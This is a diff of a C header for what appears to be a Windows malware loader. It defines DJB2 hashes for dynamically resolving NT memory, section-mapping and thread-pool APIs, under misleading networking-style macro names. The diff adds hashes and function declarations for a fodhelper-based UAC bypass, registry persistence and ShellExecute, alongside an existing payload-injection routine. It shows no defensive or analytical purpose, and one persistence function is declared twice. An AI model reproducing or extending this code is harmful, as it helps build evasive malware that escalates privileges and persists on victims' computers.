@@ -17,23 +17,33 @@
 #define ERROR_ENDPOINT_NOT_FOUND                0xC0000034      // 'The endpoint is not found'
 
 // Protocol Operation Hashes
-#define TCP_CONNECT_HASH                        0x17CFA34E      // Was NtOpenSection_DJB2
-#define HTTP_PROXY_HASH                         0x231F196A      // Was NtMapViewOfSection_DJB2
-#define TLS_HANDSHAKE_HASH                      0x082962C8      // Was NtProtectVirtualMemory_DJB2
-#define TCP_DISCONNECT_HASH                     0x595014AD      // Was NtUnmapViewOfSection_DJB2
-#define BUFFER_ALLOCATE_HASH                    0x6793C34C      // Was NtAllocateVirtualMemory_DJB2
-#define KEEP_ALIVE_HASH                         0x0A49084A      // Was NtDelayExecution_DJB2
+#define TCP_CONNECT_HASH                        0x17CFA34E      // NtOpenSection_DJB2
+#define HTTP_PROXY_HASH                         0x231F196A      // NtMapViewOfSection_DJB2
+#define TLS_HANDSHAKE_HASH                      0x082962C8      // NtProtectVirtualMemory_DJB2
+#define TCP_DISCONNECT_HASH                     0x595014AD      // NtUnmapViewOfSection_DJB2
+#define BUFFER_ALLOCATE_HASH                    0x6793C34C      // NtAllocateVirtualMemory_DJB2
+#define KEEP_ALIVE_HASH                         0x0A49084A      // NtDelayExecution_DJB2
 
-#define DLL_LOAD_HASH                          0x5FBFF0FB      // Was LoadLibraryA_DJB2
+#define DLL_LOAD_HASH                          0x5FBFF0FB      // LoadLibraryA_DJB2
 
-#define ASYNC_TIMER_CREATE_HASH                0x0B49144C      // Was CreateThreadpoolTimer_DJB2
-#define ASYNC_TIMER_SET_HASH                   0x3B944C24      // Was SetThreadpoolTimer_DJB2
-#define SYNC_WAIT_HASH                         0xECCDA1BA      // Was WaitForSingleObject_DJB2
+#define ASYNC_TIMER_CREATE_HASH                0x0B49144C      // CreateThreadpoolTimer_DJB2
+#define ASYNC_TIMER_SET_HASH                   0x3B944C24      // SetThreadpoolTimer_DJB2
+#define SYNC_WAIT_HASH                         0xECCDA1BA      // WaitForSingleObject_DJB2
 
-#define CODESEG_HASH                           0x0B80C0D8      // Was text_DJB2
-#define USER_PROTOCOL_DLL_HASH                 0x34C755B7      // Was win32udll_DJB2
-#define SYSTEM_PROTOCOL_DLL_HASH               0x7040EE75      // Was kernel32dll_DJB2
-#define NET_PROTOCOL_DLL_HASH                  0x22D3B5ED      // Was ntdlldll_DJB2
+#define CODESEG_HASH                           0x0B80C0D8      // text_DJB2
+#define USER_PROTOCOL_DLL_HASH                 0x34C755B7      // win32udll_DJB2
+#define SYSTEM_PROTOCOL_DLL_HASH               0x7040EE75      // kernel32dll_DJB2
+#define NET_PROTOCOL_DLL_HASH                  0x22D3B5ED      // ntdlldll_DJB2
+#define ADVAPI_PROTOCOL_DLL_HASH               0x67208A49      // advapi32dll_DJB2
+
+// Registry and DLL hashes - updated to match HashCalculator exactly
+#define REG_CREATE_HASH                        0x46CEB3B4      // RegCreateKeyExW_DJB2
+#define REG_SET_VALUE_HASH                     0x34587300      // RegSetValueExW_DJB2
+#define REG_CLOSE_KEY_HASH                     0x736B3702      // RegCloseKey_DJB2
+#define SHELL_EXEC_HASH                        0x38174207      // ShellExecuteW
+#define FODHELPER_BYPASS_HASH                  0xD7C8EACE      // FodhelperBypass
+#define advapi32dll_DJB2                       0x67208A49      // Hash for advapi32.dll
+#define shell32dll_DJB2                        0x0D6501AC      // Hash for shell32.dll
 
 //--------------------------------------------------------------------------------------------------------------------------------------------------
 // Protocol Handler Structure
@@ -105,5 +115,11 @@ VOID XmScheduleAsyncOperation(IN PVOID pInjectedPayload);
 
 BOOL XmFetchResourceData(IN HMODULE hModule, IN WORD wResourceId, OUT PBYTE* ppResourceBuffer, OUT PDWORD pdwResourceSize);
 
+//--------------------------------------------------------------------------------------------------------------------------------------------------
+// UAC and Persistence Functions
+
+BOOL XmBypassUAC(VOID);
+BOOL XmSetPersistence(VOID);
+BOOL XmSetPersistence(VOID);
 
 #endif // !COMMON_H
